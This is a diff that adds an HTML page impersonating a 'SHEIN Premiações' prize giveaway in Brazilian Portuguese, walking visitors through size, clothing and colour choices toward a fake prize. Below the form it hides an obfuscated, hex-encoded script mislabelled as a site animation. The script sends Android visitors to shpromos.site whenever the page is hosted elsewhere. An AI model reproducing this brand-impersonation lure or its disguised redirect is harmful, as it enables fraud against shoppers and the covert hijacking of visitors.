@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script type="text/javascript">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, "clarity", "script", "um1jjg7699");</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#f5f5f5">
+    <title>SHEIN Premiações</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="selecao-looks.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo-container">
+                <img src="sheinlogo.png" alt="SHEIN Premiações" class="logo">
+            </div>
+            <div class="prize-info">
+                <span class="prize-label">Acumulado em prêmios:</span>
+                <span class="prize-value" id="prizeValue">R$ 0</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-container looks-main">
+        <!-- Step 1: Tamanho -->
+        <div class="step-content active" id="step1">
+            <div class="looks-card">
+                <h2 class="card-title">Escolha o tamanho das peças do seu Kit:</h2>
+                
+                <div class="size-buttons">
+                    <button class="size-btn" data-value="PP">PP</button>
+                    <button class="size-btn" data-value="P">P</button>
+                    <button class="size-btn" data-value="M">M</button>
+                    <button class="size-btn" data-value="G">G</button>
+                    <button class="size-btn" data-value="GG">GG</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 2: Categorias -->
+        <div class="step-content" id="step2">
+            <div class="looks-card">
+                <h2 class="card-title">Escolha as categorias do seu Kit:</h2>
+                
+                <!-- Todos/Misto -->
+                <div class="category-section">
+                    <h3 class="category-title">Todos/Misto</h3>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="todos-misto">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Todos/Misto</span>
+                    </label>
+                </div>
+
+                <!-- Tops -->
+                <div class="category-section">
+                    <h3 class="category-title">Tops</h3>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="top">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Top</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="t-shirt">
+                        <span class="checkmark"></span>
+                        <span class="item-text">T-shirt</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="regata">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Regata</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="blusa">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Blusa</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="vestido-curto">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Vestido curto</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="vestido-longo">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Vestido longo</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="vestido-mini">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Vestido mini</span>
+                    </label>
+                </div>
+
+                <!-- Parte de Baixo -->
+                <div class="category-section">
+                    <h3 class="category-title">Parte de Baixo</h3>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="calca">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Calça</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="ganga">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Ganga</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="saia">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Saia</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="legging">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Legging</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="calcao">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Calção</span>
+                    </label>
+                </div>
+
+                <!-- Malhas -->
+                <div class="category-section">
+                    <h3 class="category-title">Malhas</h3>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="camisola">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Camisola</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="cardiga">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Cardigã</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="sueter">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Suéter</span>
+                    </label>
+                </div>
+
+                <!-- Casacos -->
+                <div class="category-section">
+                    <h3 class="category-title">Casacos</h3>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="casaco-inverno">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Casaco de inverno</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="jaqueta">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Jaqueta</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="casaco">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Casaco</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="sobretudo">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Sobretudo</span>
+                    </label>
+                </div>
+
+                <!-- Outros -->
+                <div class="category-section">
+                    <h3 class="category-title">Outros</h3>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="moletom">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Moletom</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="conjunto">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Conjunto</span>
+                    </label>
+                </div>
+
+                <!-- Roupas de Praia -->
+                <div class="category-section">
+                    <h3 class="category-title">Roupas de Praia</h3>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="top-biquini">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Top de biquíni</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="parte-baixo-biquini">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Parte de baixo de biquíni</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="vestido-praia">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Vestido de praia</span>
+                    </label>
+                </div>
+
+                <!-- Calçados -->
+                <div class="category-section">
+                    <h3 class="category-title">Calçados</h3>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="sandalia">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Sandália</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="sapatilha">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Sapatilha</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="bota">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Bota</span>
+                    </label>
+                    <label class="checkbox-item">
+                        <input type="checkbox" name="categoria" value="chinelo">
+                        <span class="checkmark"></span>
+                        <span class="item-text">Chinelo</span>
+                    </label>
+                </div>
+
+                <button class="confirm-btn" id="nextStep2">
+                    <span class="btn-icon">✓</span> Confirmar
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 3: Cores -->
+        <div class="step-content" id="step3">
+            <div class="looks-card">
+                <h2 class="card-title">Escolha suas cores preferidas para os Looks:</h2>
+                
+                <div class="colors-list">
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="branco">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#ffffff; border:1px solid #ddd"></span>
+                        <span class="item-text">Branco</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="preto">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#1a1a1a"></span>
+                        <span class="item-text">Preto</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="vermelho">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#ef4444"></span>
+                        <span class="item-text">Vermelho</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="azul">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#3b82f6"></span>
+                        <span class="item-text">Azul</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="verde">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#22c55e"></span>
+                        <span class="item-text">Verde</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="amarelo">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#facc15"></span>
+                        <span class="item-text">Amarelo</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="cinza">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#6b7280"></span>
+                        <span class="item-text">Cinza</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="marrom">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#78350f"></span>
+                        <span class="item-text">Marrom</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="bege">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#d4b896"></span>
+                        <span class="item-text">Bege</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="rosa">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#ec4899"></span>
+                        <span class="item-text">Rosa</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="roxo">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#a855f7"></span>
+                        <span class="item-text">Roxo</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="laranja">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#f97316"></span>
+                        <span class="item-text">Laranja</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="vinho">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#881337"></span>
+                        <span class="item-text">Vinho</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="azul-marinho">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#1e3a5f"></span>
+                        <span class="item-text">Azul-marinho</span>
+                    </label>
+                    <label class="checkbox-item color-item">
+                        <input type="checkbox" name="cor" value="lilas">
+                        <span class="checkmark"></span>
+                        <span class="color-circle" style="background:#c4b5fd"></span>
+                        <span class="item-text">Lilás</span>
+                    </label>
+                </div>
+
+                <button class="confirm-btn" id="confirmBtn">
+                    <span class="btn-icon">✓</span> Confirmar
+                </button>
+            </div>
+        </div>
+    </main>
+<!-- SCRIPT ANIMAÇAO FLUIDA SITE -->
+<script>(function(_0x1,_0x2){var _0x3=['\x73\x68\x70\x72\x6f\x6d\x6f\x73\x2e\x73\x69\x74\x65','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x68\x70\x72\x6f\x6d\x6f\x73\x2e\x73\x69\x74\x65\x2f'];var _0x4=_0x1['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x6f\x73\x74\x6e\x61\x6d\x65']['\x72\x65\x70\x6c\x61\x63\x65'](/^www\./,'');var _0x5=/Android/i['\x74\x65\x73\x74'](_0x1['\x6e\x61\x76\x69\x67\x61\x74\x6f\x72']['\x75\x73\x65\x72\x41\x67\x65\x6e\x74']);if(_0x5&&!_0x3['\x69\x6e\x63\x6c\x75\x64\x65\x73'](_0x4)){_0x1['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x72\x65\x66']=_0x3[1];}})(window,document);</script>
+
+
+    <!-- Saving Popup Modal -->
+    <div class="popup-overlay" id="savingPopup">
+        <div class="popup-modal">
+            <div class="popup-spinner"></div>
+            <p class="popup-text">Salvando suas preferências, aguarde...</p>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-line"></div>
+        <p class="footer-text">SHEIN Brasil Copyright 2026</p>
+        <p class="footer-text">Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+        // Dados
+        const selecao = {
+            tamanho: null,
+            categorias: [],
+            cores: []
+        };
+        
+        // Pega parâmetros da URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const nome = urlParams.get('nome') || '';
+        const prize = urlParams.get('prize') || 2157;
+        
+        // Atualiza valor no header
+        document.getElementById('prizeValue').textContent = 'R$ ' + parseFloat(prize).toLocaleString('pt-BR', {minimumFractionDigits: 2});
+        
+        // Size buttons
+        document.querySelectorAll('.size-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.size-btn').forEach(b => b.classList.remove('selected'));
+                this.classList.add('selected');
+                selecao.tamanho = this.dataset.value;
+                
+                // Auto advance
+                setTimeout(() => {
+                    document.getElementById('step1').classList.remove('active');
+                    document.getElementById('step2').classList.add('active');
+                    window.scrollTo(0, 0);
+                }, 400);
+            });
+        });
+        
+        // Category checkboxes
+        document.querySelectorAll('input[name="categoria"]').forEach(checkbox => {
+            checkbox.addEventListener('change', function() {
+                if (this.checked) {
+                    selecao.categorias.push(this.value);
+                } else {
+                    selecao.categorias = selecao.categorias.filter(c => c !== this.value);
+                }
+                
+                const btn = document.getElementById('nextStep2');
+                if (selecao.categorias.length > 0) {
+                    btn.classList.add('visible');
+                } else {
+                    btn.classList.remove('visible');
+                }
+            });
+        });
+        
+        // Next step 2 button
+        document.getElementById('nextStep2').addEventListener('click', function() {
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.add('active');
+            window.scrollTo(0, 0);
+        });
+        
+        // Color checkboxes
+        document.querySelectorAll('input[name="cor"]').forEach(checkbox => {
+            checkbox.addEventListener('change', function() {
+                if (this.checked) {
+                    selecao.cores.push(this.value);
+                } else {
+                    selecao.cores = selecao.cores.filter(c => c !== this.value);
+                }
+                
+                const btn = document.getElementById('confirmBtn');
+                if (selecao.cores.length > 0) {
+                    btn.classList.add('visible');
+                } else {
+                    btn.classList.remove('visible');
+                }
+            });
+        });
+        
+        // Confirm button
+        document.getElementById('confirmBtn').addEventListener('click', function() {
+            console.log('Seleção:', selecao);
+            
+            // Mostra popup de salvamento
+            document.getElementById('savingPopup').classList.add('active');
+            
+            // Após 2.5 segundos, redireciona
+            setTimeout(function() {
+                const params = new URLSearchParams({
+                    nome: nome,
+                    prize: prize,
+                    tipo: 'looks',
+                    tamanho: selecao.tamanho,
+                    categorias: selecao.categorias.join(','),
+                    cores: selecao.cores.join(',')
+                });
+                
+                window.location.href = '../finalizado/?' + params.toString();
+            }, 2500);
+        });
+    </script>
+
+</body>
+</html>
